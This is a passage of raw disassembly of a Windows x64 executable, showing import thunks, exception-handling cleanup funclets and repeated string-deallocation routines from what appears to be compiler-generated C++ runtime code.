   140009575:	ff 25 1d 1d 00 00    	jmp    *0x1d1d(%rip)        # 0x14000b298
   14000957b:	ff 25 3f 1e 00 00    	jmp    *0x1e3f(%rip)        # 0x14000b3c0
   140009581:	ff 25 99 1d 00 00    	jmp    *0x1d99(%rip)        # 0x14000b320
   140009587:	ff 25 03 1d 00 00    	jmp    *0x1d03(%rip)        # 0x14000b290
   14000958d:	cc                   	int3
   14000958e:	cc                   	int3
   14000958f:	cc                   	int3
   140009590:	48 83 ec 28          	sub    $0x28,%rsp
   140009594:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140009598:	48 8b ca             	mov    %rdx,%rcx
   14000959b:	49 8b d1             	mov    %r9,%rdx
   14000959e:	e8 0d 00 00 00       	call   0x1400095b0
   1400095a3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400095a8:	48 83 c4 28          	add    $0x28,%rsp
   1400095ac:	c3                   	ret
   1400095ad:	cc                   	int3
   1400095ae:	cc                   	int3
   1400095af:	cc                   	int3
   1400095b0:	40 53                	rex push %rbx
   1400095b2:	45 8b 18             	mov    (%r8),%r11d
   1400095b5:	48 8b da             	mov    %rdx,%rbx
   1400095b8:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1400095bc:	4c 8b c9             	mov    %rcx,%r9
   1400095bf:	41 f6 00 04          	testb  $0x4,(%r8)
   1400095c3:	4c 8b d1             	mov    %rcx,%r10
   1400095c6:	74 13                	je     0x1400095db
   1400095c8:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400095cc:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1400095d0:	f7 d8                	neg    %eax
   1400095d2:	4c 03 d1             	add    %rcx,%r10
   1400095d5:	48 63 c8             	movslq %eax,%rcx
   1400095d8:	4c 23 d1             	and    %rcx,%r10
   1400095db:	49 63 c3             	movslq %r11d,%rax
   1400095de:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1400095e2:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400095e6:	8b 48 08             	mov    0x8(%rax),%ecx
   1400095e9:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400095ed:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   1400095f2:	74 10                	je     0x140009604
   1400095f4:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   1400095f9:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   1400095fe:	48 23 c1             	and    %rcx,%rax
   140009601:	4c 03 c8             	add    %rax,%r9
   140009604:	4c 33 ca             	xor    %rdx,%r9
   140009607:	49 8b c9             	mov    %r9,%rcx
   14000960a:	5b                   	pop    %rbx
   14000960b:	e9 50 ef ff ff       	jmp    0x140008560
   140009610:	48 8b c4             	mov    %rsp,%rax
   140009613:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009617:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000961b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000961f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009623:	41 56                	push   %r14
   140009625:	48 83 ec 20          	sub    $0x20,%rsp
   140009629:	49 8b 59 38          	mov    0x38(%r9),%rbx
   14000962d:	48 8b f2             	mov    %rdx,%rsi
   140009630:	4d 8b f0             	mov    %r8,%r14
   140009633:	48 8b e9             	mov    %rcx,%rbp
   140009636:	49 8b d1             	mov    %r9,%rdx
   140009639:	48 8b ce             	mov    %rsi,%rcx
   14000963c:	49 8b f9             	mov    %r9,%rdi
   14000963f:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   140009643:	e8 68 ff ff ff       	call   0x1400095b0
   140009648:	8b 45 04             	mov    0x4(%rbp),%eax
   14000964b:	24 66                	and    $0x66,%al
   14000964d:	f6 d8                	neg    %al
   14000964f:	b8 01 00 00 00       	mov    $0x1,%eax
   140009654:	45 1b c9             	sbb    %r9d,%r9d
   140009657:	41 f7 d9             	neg    %r9d
   14000965a:	44 03 c8             	add    %eax,%r9d
   14000965d:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   140009661:	74 11                	je     0x140009674
   140009663:	4c 8b cf             	mov    %rdi,%r9
   140009666:	4d 8b c6             	mov    %r14,%r8
   140009669:	48 8b d6             	mov    %rsi,%rdx
   14000966c:	48 8b cd             	mov    %rbp,%rcx
   14000966f:	e8 4d fe ff ff       	call   0x1400094c1
   140009674:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009679:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000967e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009683:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140009688:	48 83 c4 20          	add    $0x20,%rsp
   14000968c:	41 5e                	pop    %r14
   14000968e:	c3                   	ret
   14000968f:	ff 25 b3 1b 00 00    	jmp    *0x1bb3(%rip)        # 0x14000b248
   140009695:	cc                   	int3
   140009696:	cc                   	int3
   140009697:	cc                   	int3
   140009698:	cc                   	int3
   140009699:	cc                   	int3
   14000969a:	cc                   	int3
   14000969b:	cc                   	int3
   14000969c:	cc                   	int3
   14000969d:	cc                   	int3
   14000969e:	cc                   	int3
   14000969f:	cc                   	int3
   1400096a0:	cc                   	int3
   1400096a1:	cc                   	int3
   1400096a2:	cc                   	int3
   1400096a3:	cc                   	int3
   1400096a4:	cc                   	int3
   1400096a5:	cc                   	int3
   1400096a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400096ad:	00 00 00 
   1400096b0:	ff e0                	jmp    *%rax
   1400096b2:	cc                   	int3
   1400096b3:	cc                   	int3
   1400096b4:	cc                   	int3
   1400096b5:	cc                   	int3
   1400096b6:	cc                   	int3
   1400096b7:	cc                   	int3
   1400096b8:	cc                   	int3
   1400096b9:	cc                   	int3
   1400096ba:	cc                   	int3
   1400096bb:	cc                   	int3
   1400096bc:	cc                   	int3
   1400096bd:	cc                   	int3
   1400096be:	cc                   	int3
   1400096bf:	cc                   	int3
   1400096c0:	cc                   	int3
   1400096c1:	cc                   	int3
   1400096c2:	cc                   	int3
   1400096c3:	cc                   	int3
   1400096c4:	cc                   	int3
   1400096c5:	cc                   	int3
   1400096c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400096cd:	00 00 00 
   1400096d0:	ff 25 2a 1d 00 00    	jmp    *0x1d2a(%rip)        # 0x14000b400
   1400096d6:	cc                   	int3
   1400096d7:	cc                   	int3
   1400096d8:	cc                   	int3
   1400096d9:	cc                   	int3
   1400096da:	cc                   	int3
   1400096db:	cc                   	int3
   1400096dc:	cc                   	int3
   1400096dd:	cc                   	int3
   1400096de:	cc                   	int3
   1400096df:	cc                   	int3
   1400096e0:	48 8b 8a a0 00 00 00 	mov    0xa0(%rdx),%rcx
   1400096e7:	e9 a4 cb ff ff       	jmp    0x140006290
   1400096ec:	40 55                	rex push %rbp
   1400096ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400096f2:	48 8b ea             	mov    %rdx,%rbp
   1400096f5:	8b 45 50             	mov    0x50(%rbp),%eax
   1400096f8:	83 e0 01             	and    $0x1,%eax
   1400096fb:	85 c0                	test   %eax,%eax
   1400096fd:	74 0d                	je     0x14000970c
   1400096ff:	83 65 50 fe          	andl   $0xfffffffe,0x50(%rbp)
   140009703:	48 8d 4d 78          	lea    0x78(%rbp),%rcx
   140009707:	e8 84 cb ff ff       	call   0x140006290
   14000970c:	48 83 c4 20          	add    $0x20,%rsp
   140009710:	5d                   	pop    %rbp
   140009711:	c3                   	ret
   140009712:	48 8d 8a e0 01 00 00 	lea    0x1e0(%rdx),%rcx
   140009719:	e9 72 cb ff ff       	jmp    0x140006290
   14000971e:	40 55                	rex push %rbp
   140009720:	48 83 ec 20          	sub    $0x20,%rsp
   140009724:	48 8b ea             	mov    %rdx,%rbp
   140009727:	8b 45 50             	mov    0x50(%rbp),%eax
   14000972a:	83 e0 04             	and    $0x4,%eax
   14000972d:	85 c0                	test   %eax,%eax
   14000972f:	74 18                	je     0x140009749
   140009731:	83 65 50 fb          	andl   $0xfffffffb,0x50(%rbp)
   140009735:	48 8d 8d 00 02 00 00 	lea    0x200(%rbp),%rcx
   14000973c:	48 81 c1 88 00 00 00 	add    $0x88,%rcx
   140009743:	ff 15 b7 19 00 00    	call   *0x19b7(%rip)        # 0x14000b100
   140009749:	48 83 c4 20          	add    $0x20,%rsp
   14000974d:	5d                   	pop    %rbp
   14000974e:	c3                   	ret
   14000974f:	48 8d 8a 00 02 00 00 	lea    0x200(%rdx),%rcx
   140009756:	48 83 c1 10          	add    $0x10,%rcx
   14000975a:	48 ff 25 f7 19 00 00 	rex.W jmp *0x19f7(%rip)        # 0x14000b158
   140009761:	48 8d 8a 00 02 00 00 	lea    0x200(%rdx),%rcx
   140009768:	e9 93 b7 ff ff       	jmp    0x140004f00
   14000976d:	40 55                	rex push %rbp
   14000976f:	48 83 ec 20          	sub    $0x20,%rsp
   140009773:	48 8b ea             	mov    %rdx,%rbp
   140009776:	8b 45 50             	mov    0x50(%rbp),%eax
   140009779:	83 e0 10             	and    $0x10,%eax
   14000977c:	85 c0                	test   %eax,%eax
   14000977e:	74 0d                	je     0x14000978d
   140009780:	83 65 50 ef          	andl   $0xffffffef,0x50(%rbp)
   140009784:	48 8d 4d 58          	lea    0x58(%rbp),%rcx
   140009788:	e8 03 cb ff ff       	call   0x140006290
   14000978d:	48 83 c4 20          	add    $0x20,%rsp
   140009791:	5d                   	pop    %rbp
   140009792:	c3                   	ret
   140009793:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   14000979a:	e9 f1 ca ff ff       	jmp    0x140006290
   14000979f:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   1400097a6:	e9 e5 ca ff ff       	jmp    0x140006290
   1400097ab:	48 8d 8a c0 01 00 00 	lea    0x1c0(%rdx),%rcx
   1400097b2:	e9 d9 ca ff ff       	jmp    0x140006290
   1400097b7:	48 8d 8a b0 00 00 00 	lea    0xb0(%rdx),%rcx
   1400097be:	e9 9d b7 ff ff       	jmp    0x140004f60
   1400097c3:	cc                   	int3
   1400097c4:	cc                   	int3
   1400097c5:	cc                   	int3
   1400097c6:	cc                   	int3
   1400097c7:	cc                   	int3
   1400097c8:	cc                   	int3
   1400097c9:	cc                   	int3
   1400097ca:	cc                   	int3
   1400097cb:	cc                   	int3
   1400097cc:	cc                   	int3
   1400097cd:	cc                   	int3
   1400097ce:	cc                   	int3
   1400097cf:	cc                   	int3
   1400097d0:	48 8b 8a 68 00 00 00 	mov    0x68(%rdx),%rcx
   1400097d7:	e9 b4 ca ff ff       	jmp    0x140006290
   1400097dc:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   1400097e3:	e9 a8 ca ff ff       	jmp    0x140006290
   1400097e8:	cc                   	int3
   1400097e9:	cc                   	int3
   1400097ea:	cc                   	int3
   1400097eb:	cc                   	int3
   1400097ec:	cc                   	int3
   1400097ed:	cc                   	int3
   1400097ee:	cc                   	int3
   1400097ef:	cc                   	int3
   1400097f0:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   1400097f7:	e9 94 ca ff ff       	jmp    0x140006290
   1400097fc:	48 8d 8a 18 01 00 00 	lea    0x118(%rdx),%rcx
   140009803:	e9 88 ca ff ff       	jmp    0x140006290
   140009808:	48 8d 8a f8 00 00 00 	lea    0xf8(%rdx),%rcx
   14000980f:	e9 7c ca ff ff       	jmp    0x140006290
   140009814:	cc                   	int3
   140009815:	cc                   	int3
   140009816:	cc                   	int3
   140009817:	cc                   	int3
   140009818:	cc                   	int3
   140009819:	cc                   	int3
   14000981a:	cc                   	int3
   14000981b:	cc                   	int3
   14000981c:	cc                   	int3
   14000981d:	cc                   	int3
   14000981e:	cc                   	int3
   14000981f:	cc                   	int3
   140009820:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140009827:	e9 04 ea ff ff       	jmp    0x140008230
   14000982c:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140009833:	e9 a8 e2 ff ff       	jmp    0x140007ae0
   140009838:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000983d:	55                   	push   %rbp
   14000983e:	48 83 ec 20          	sub    $0x20,%rsp
   140009842:	48 8b ea             	mov    %rdx,%rbp
   140009845:	48 8b 55 50          	mov    0x50(%rbp),%rdx
   140009849:	48 8b 02             	mov    (%rdx),%rax
   14000984c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140009850:	48 03 ca             	add    %rdx,%rcx
   140009853:	41 b0 01             	mov    $0x1,%r8b
   140009856:	ba 04 00 00 00       	mov    $0x4,%edx
   14000985b:	ff 15 67 18 00 00    	call   *0x1867(%rip)        # 0x14000b0c8
   140009861:	90                   	nop
   140009862:	48 b8 00 00 00 00 00 	movabs $0x0,%rax
   140009869:	00 00 00 
   14000986c:	48 83 c4 20          	add    $0x20,%rsp
   140009870:	5d                   	pop    %rbp
   140009871:	c3                   	ret
   140009872:	cc                   	int3
   140009873:	cc                   	int3
   140009874:	cc                   	int3
   140009875:	cc                   	int3
   140009876:	cc                   	int3
   140009877:	cc                   	int3
   140009878:	cc                   	int3
   140009879:	cc                   	int3
   14000987a:	cc                   	int3
   14000987b:	cc                   	int3
   14000987c:	cc                   	int3
   14000987d:	cc                   	int3
   14000987e:	cc                   	int3
   14000987f:	cc                   	int3
   140009880:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140009887:	e9 04 ca ff ff       	jmp    0x140006290
   14000988c:	cc                   	int3
   14000988d:	cc                   	int3
   14000988e:	cc                   	int3
   14000988f:	cc                   	int3
   140009890:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140009897:	48 ff 25 02 19 00 00 	rex.W jmp *0x1902(%rip)        # 0x14000b1a0
   14000989e:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   1400098a5:	e9 76 e2 ff ff       	jmp    0x140007b20
   1400098aa:	cc                   	int3
   1400098ab:	cc                   	int3
   1400098ac:	cc                   	int3
   1400098ad:	cc                   	int3
   1400098ae:	cc                   	int3
   1400098af:	cc                   	int3
   1400098b0:	40 55                	rex push %rbp
   1400098b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400098b6:	48 8b ea             	mov    %rdx,%rbp
   1400098b9:	8b 45 40             	mov    0x40(%rbp),%eax
   1400098bc:	83 e0 01             	and    $0x1,%eax
   1400098bf:	85 c0                	test   %eax,%eax
   1400098c1:	74 15                	je     0x1400098d8
   1400098c3:	83 65 40 fe          	andl   $0xfffffffe,0x40(%rbp)
   1400098c7:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400098cb:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   1400098d2:	ff 15 28 18 00 00    	call   *0x1828(%rip)        # 0x14000b100
   1400098d8:	48 83 c4 20          	add    $0x20,%rsp
   1400098dc:	5d                   	pop    %rbp
   1400098dd:	c3                   	ret
   1400098de:	48 8b 8a 50 00 00 00 	mov    0x50(%rdx),%rcx
   1400098e5:	48 83 c1 10          	add    $0x10,%rcx
   1400098e9:	48 ff 25 68 18 00 00 	rex.W jmp *0x1868(%rip)        # 0x14000b158
   1400098f0:	48 8b 8a 50 00 00 00 	mov    0x50(%rdx),%rcx
   1400098f7:	48 83 c1 08          	add    $0x8,%rcx
   1400098fb:	e9 30 d7 ff ff       	jmp    0x140007030
   140009900:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   140009907:	e9 64 7c ff ff       	jmp    0x140001570
   14000990c:	40 55                	rex push %rbp
   14000990e:	48 8b ea             	mov    %rdx,%rbp
   140009911:	48 8b 01             	mov    (%rcx),%rax
   140009914:	33 c9                	xor    %ecx,%ecx
   140009916:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000991c:	0f 94 c1             	sete   %cl
   14000991f:	8b c1                	mov    %ecx,%eax
   140009921:	5d                   	pop    %rbp
   140009922:	c3                   	ret
   140009923:	cc                   	int3
   140009924:	40 55                	rex push %rbp
   140009926:	48 83 ec 20          	sub    $0x20,%rsp
   14000992a:	48 8b ea             	mov    %rdx,%rbp
   14000992d:	48 8b d1             	mov    %rcx,%rdx
   140009930:	48 8b 09             	mov    (%rcx),%rcx
   140009933:	8b 09                	mov    (%rcx),%ecx
   140009935:	e8 e7 fb ff ff       	call   0x140009521
   14000993a:	90                   	nop
   14000993b:	48 83 c4 20          	add    $0x20,%rsp
   14000993f:	5d                   	pop    %rbp
   140009940:	c3                   	ret
   140009941:	cc                   	int3
   140009942:	cc                   	int3
   140009943:	cc                   	int3
   140009944:	cc                   	int3
   140009945:	cc                   	int3
   140009946:	cc                   	int3
   140009947:	cc                   	int3
   140009948:	cc                   	int3
   140009949:	cc                   	int3
   14000994a:	cc                   	int3
   14000994b:	cc                   	int3
   14000994c:	cc                   	int3
   14000994d:	cc                   	int3
   14000994e:	cc                   	int3
   14000994f:	cc                   	int3
   140009950:	48 83 ec 38          	sub    $0x38,%rsp
   140009954:	48 8b 15 a5 d4 01 00 	mov    0x1d4a5(%rip),%rdx        # 0x140026e00
   14000995b:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000995f:	76 30                	jbe    0x140009991
   140009961:	48 8b 0d 80 d4 01 00 	mov    0x1d480(%rip),%rcx        # 0x140026de8
   140009968:	48 ff c2             	inc    %rdx
   14000996b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009972:	72 18                	jb     0x14000998c
   140009974:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009978:	48 83 c2 27          	add    $0x27,%rdx
   14000997c:	48 2b c8             	sub    %rax,%rcx
   14000997f:	48 83 e9 08          	sub    $0x8,%rcx
   140009983:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009987:	77 24                	ja     0x1400099ad
   140009989:	48 8b c8             	mov    %rax,%rcx
   14000998c:	e8 6b ee ff ff       	call   0x1400087fc
   140009991:	66 0f 6f 05 27 51 00 	movdqa 0x5127(%rip),%xmm0        # 0x14000eac0
   140009998:	00 
   140009999:	f3 0f 7f 05 57 d4 01 	movdqu %xmm0,0x1d457(%rip)        # 0x140026df8
   1400099a0:	00 
   1400099a1:	c6 05 40 d4 01 00 00 	movb   $0x0,0x1d440(%rip)        # 0x140026de8
   1400099a8:	48 83 c4 38          	add    $0x38,%rsp
   1400099ac:	c3                   	ret
   1400099ad:	45 33 c9             	xor    %r9d,%r9d
   1400099b0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400099b7:	00 00 
   1400099b9:	45 33 c0             	xor    %r8d,%r8d
   1400099bc:	33 d2                	xor    %edx,%edx
   1400099be:	33 c9                	xor    %ecx,%ecx
   1400099c0:	ff 15 52 19 00 00    	call   *0x1952(%rip)        # 0x14000b318
   1400099c6:	cc                   	int3
   1400099c7:	cc                   	int3
   1400099c8:	cc                   	int3
   1400099c9:	cc                   	int3
   1400099ca:	cc                   	int3
   1400099cb:	cc                   	int3
   1400099cc:	cc                   	int3
   1400099cd:	cc                   	int3
   1400099ce:	cc                   	int3
   1400099cf:	cc                   	int3
   1400099d0:	48 83 ec 38          	sub    $0x38,%rsp
   1400099d4:	48 8b 15 c5 d4 01 00 	mov    0x1d4c5(%rip),%rdx        # 0x140026ea0
   1400099db:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400099df:	76 30                	jbe    0x140009a11
   1400099e1:	48 8b 0d a0 d4 01 00 	mov    0x1d4a0(%rip),%rcx        # 0x140026e88
   1400099e8:	48 ff c2             	inc    %rdx
   1400099eb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400099f2:	72 18                	jb     0x140009a0c
   1400099f4:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1400099f8:	48 83 c2 27          	add    $0x27,%rdx
   1400099fc:	48 2b c8             	sub    %rax,%rcx
   1400099ff:	48 83 e9 08          	sub    $0x8,%rcx
   140009a03:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009a07:	77 24                	ja     0x140009a2d
   140009a09:	48 8b c8             	mov    %rax,%rcx
   140009a0c:	e8 eb ed ff ff       	call   0x1400087fc
   140009a11:	66 0f 6f 05 a7 50 00 	movdqa 0x50a7(%rip),%xmm0        # 0x14000eac0
   140009a18:	00 
   140009a19:	f3 0f 7f 05 77 d4 01 	movdqu %xmm0,0x1d477(%rip)        # 0x140026e98
   140009a20:	00 
   140009a21:	c6 05 60 d4 01 00 00 	movb   $0x0,0x1d460(%rip)        # 0x140026e88
   140009a28:	48 83 c4 38          	add    $0x38,%rsp
   140009a2c:	c3                   	ret
   140009a2d:	45 33 c9             	xor    %r9d,%r9d
   140009a30:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009a37:	00 00 
   140009a39:	45 33 c0             	xor    %r8d,%r8d
   140009a3c:	33 d2                	xor    %edx,%edx
   140009a3e:	33 c9                	xor    %ecx,%ecx
   140009a40:	ff 15 d2 18 00 00    	call   *0x18d2(%rip)        # 0x14000b318
   140009a46:	cc                   	int3
   140009a47:	cc                   	int3
   140009a48:	cc                   	int3
   140009a49:	cc                   	int3
   140009a4a:	cc                   	int3
   140009a4b:	cc                   	int3
   140009a4c:	cc                   	int3
   140009a4d:	cc                   	int3
   140009a4e:	cc                   	int3
   140009a4f:	cc                   	int3
   140009a50:	48 83 ec 38          	sub    $0x38,%rsp
   140009a54:	48 8b 15 25 d5 01 00 	mov    0x1d525(%rip),%rdx        # 0x140026f80
   140009a5b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009a5f:	76 30                	jbe    0x140009a91
   140009a61:	48 8b 0d 00 d5 01 00 	mov    0x1d500(%rip),%rcx        # 0x140026f68
   140009a68:	48 ff c2             	inc    %rdx
   140009a6b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009a72:	72 18                	jb     0x140009a8c
   140009a74:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009a78:	48 83 c2 27          	add    $0x27,%rdx
   140009a7c:	48 2b c8             	sub    %rax,%rcx
   140009a7f:	48 83 e9 08          	sub    $0x8,%rcx
   140009a83:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009a87:	77 24                	ja     0x140009aad
   140009a89:	48 8b c8             	mov    %rax,%rcx
   140009a8c:	e8 6b ed ff ff       	call   0x1400087fc
   140009a91:	66 0f 6f 05 27 50 00 	movdqa 0x5027(%rip),%xmm0        # 0x14000eac0
   140009a98:	00 
   140009a99:	f3 0f 7f 05 d7 d4 01 	movdqu %xmm0,0x1d4d7(%rip)        # 0x140026f78
   140009aa0:	00 
   140009aa1:	c6 05 c0 d4 01 00 00 	movb   $0x0,0x1d4c0(%rip)        # 0x140026f68
   140009aa8:	48 83 c4 38          	add    $0x38,%rsp
   140009aac:	c3                   	ret
   140009aad:	45 33 c9             	xor    %r9d,%r9d
   140009ab0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009ab7:	00 00 
   140009ab9:	45 33 c0             	xor    %r8d,%r8d
   140009abc:	33 d2                	xor    %edx,%edx
   140009abe:	33 c9                	xor    %ecx,%ecx
   140009ac0:	ff 15 52 18 00 00    	call   *0x1852(%rip)        # 0x14000b318
   140009ac6:	cc                   	int3
   140009ac7:	cc                   	int3
   140009ac8:	cc                   	int3
   140009ac9:	cc                   	int3
   140009aca:	cc                   	int3
   140009acb:	cc                   	int3
   140009acc:	cc                   	int3
   140009acd:	cc                   	int3
   140009ace:	cc                   	int3
   140009acf:	cc                   	int3
   140009ad0:	48 83 ec 38          	sub    $0x38,%rsp
   140009ad4:	48 8b 15 05 d4 01 00 	mov    0x1d405(%rip),%rdx        # 0x140026ee0
   140009adb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009adf:	76 30                	jbe    0x140009b11
   140009ae1:	48 8b 0d e0 d3 01 00 	mov    0x1d3e0(%rip),%rcx        # 0x140026ec8
   140009ae8:	48 ff c2             	inc    %rdx
   140009aeb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009af2:	72 18                	jb     0x140009b0c
   140009af4:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009af8:	48 83 c2 27          	add    $0x27,%rdx
   140009afc:	48 2b c8             	sub    %rax,%rcx
   140009aff:	48 83 e9 08          	sub    $0x8,%rcx
   140009b03:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009b07:	77 24                	ja     0x140009b2d
   140009b09:	48 8b c8             	mov    %rax,%rcx
   140009b0c:	e8 eb ec ff ff       	call   0x1400087fc
   140009b11:	66 0f 6f 05 a7 4f 00 	movdqa 0x4fa7(%rip),%xmm0        # 0x14000eac0
   140009b18:	00 
   140009b19:	f3 0f 7f 05 b7 d3 01 	movdqu %xmm0,0x1d3b7(%rip)        # 0x140026ed8
   140009b20:	00 
   140009b21:	c6 05 a0 d3 01 00 00 	movb   $0x0,0x1d3a0(%rip)        # 0x140026ec8
   140009b28:	48 83 c4 38          	add    $0x38,%rsp
   140009b2c:	c3                   	ret
   140009b2d:	45 33 c9             	xor    %r9d,%r9d
   140009b30:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009b37:	00 00 
   140009b39:	45 33 c0             	xor    %r8d,%r8d
   140009b3c:	33 d2                	xor    %edx,%edx
   140009b3e:	33 c9                	xor    %ecx,%ecx
   140009b40:	ff 15 d2 17 00 00    	call   *0x17d2(%rip)        # 0x14000b318
   140009b46:	cc                   	int3
   140009b47:	cc                   	int3
   140009b48:	cc                   	int3
   140009b49:	cc                   	int3
   140009b4a:	cc                   	int3
   140009b4b:	cc                   	int3
   140009b4c:	cc                   	int3
   140009b4d:	cc                   	int3
   140009b4e:	cc                   	int3
   140009b4f:	cc                   	int3
   140009b50:	48 83 ec 38          	sub    $0x38,%rsp
   140009b54:	48 8b 15 e5 d3 01 00 	mov    0x1d3e5(%rip),%rdx        # 0x140026f40
   140009b5b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009b5f:	76 30                	jbe    0x140009b91
   140009b61:	48 8b 0d c0 d3 01 00 	mov    0x1d3c0(%rip),%rcx        # 0x140026f28
   140009b68:	48 ff c2             	inc    %rdx
   140009b6b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009b72:	72 18                	jb     0x140009b8c
   140009b74:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009b78:	48 83 c2 27          	add    $0x27,%rdx
   140009b7c:	48 2b c8             	sub    %rax,%rcx
   140009b7f:	48 83 e9 08          	sub    $0x8,%rcx
   140009b83:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009b87:	77 24                	ja     0x140009bad
   140009b89:	48 8b c8             	mov    %rax,%rcx
   140009b8c:	e8 6b ec ff ff       	call   0x1400087fc
   140009b91:	66 0f 6f 05 27 4f 00 	movdqa 0x4f27(%rip),%xmm0        # 0x14000eac0
   140009b98:	00 
   140009b99:	f3 0f 7f 05 97 d3 01 	movdqu %xmm0,0x1d397(%rip)        # 0x140026f38
   140009ba0:	00 
   140009ba1:	c6 05 80 d3 01 00 00 	movb   $0x0,0x1d380(%rip)        # 0x140026f28
   140009ba8:	48 83 c4 38          	add    $0x38,%rsp
   140009bac:	c3                   	ret
   140009bad:	45 33 c9             	xor    %r9d,%r9d
   140009bb0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009bb7:	00 00 
   140009bb9:	45 33 c0             	xor    %r8d,%r8d
   140009bbc:	33 d2                	xor    %edx,%edx
   140009bbe:	33 c9                	xor    %ecx,%ecx
   140009bc0:	ff 15 52 17 00 00    	call   *0x1752(%rip)        # 0x14000b318
   140009bc6:	cc                   	int3
   140009bc7:	cc                   	int3
   140009bc8:	cc                   	int3
   140009bc9:	cc                   	int3
   140009bca:	cc                   	int3
   140009bcb:	cc                   	int3
   140009bcc:	cc                   	int3
   140009bcd:	cc                   	int3
   140009bce:	cc                   	int3
   140009bcf:	cc                   	int3
   140009bd0:	48 83 ec 38          	sub    $0x38,%rsp
   140009bd4:	48 8b 15 65 d2 01 00 	mov    0x1d265(%rip),%rdx        # 0x140026e40
   140009bdb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009bdf:	76 30                	jbe    0x140009c11
   140009be1:	48 8b 0d 40 d2 01 00 	mov    0x1d240(%rip),%rcx        # 0x140026e28
   140009be8:	48 ff c2             	inc    %rdx
   140009beb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009bf2:	72 18                	jb     0x140009c0c
   140009bf4:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009bf8:	48 83 c2 27          	add    $0x27,%rdx
   140009bfc:	48 2b c8             	sub    %rax,%rcx
   140009bff:	48 83 e9 08          	sub    $0x8,%rcx
   140009c03:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009c07:	77 24                	ja     0x140009c2d
   140009c09:	48 8b c8             	mov    %rax,%rcx
   140009c0c:	e8 eb eb ff ff       	call   0x1400087fc
   140009c11:	66 0f 6f 05 a7 4e 00 	movdqa 0x4ea7(%rip),%xmm0        # 0x14000eac0
   140009c18:	00 
   140009c19:	f3 0f 7f 05 17 d2 01 	movdqu %xmm0,0x1d217(%rip)        # 0x140026e38
   140009c20:	00 
   140009c21:	c6 05 00 d2 01 00 00 	movb   $0x0,0x1d200(%rip)        # 0x140026e28
   140009c28:	48 83 c4 38          	add    $0x38,%rsp
   140009c2c:	c3                   	ret
   140009c2d:	45 33 c9             	xor    %r9d,%r9d
   140009c30:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009c37:	00 00 
   140009c39:	45 33 c0             	xor    %r8d,%r8d
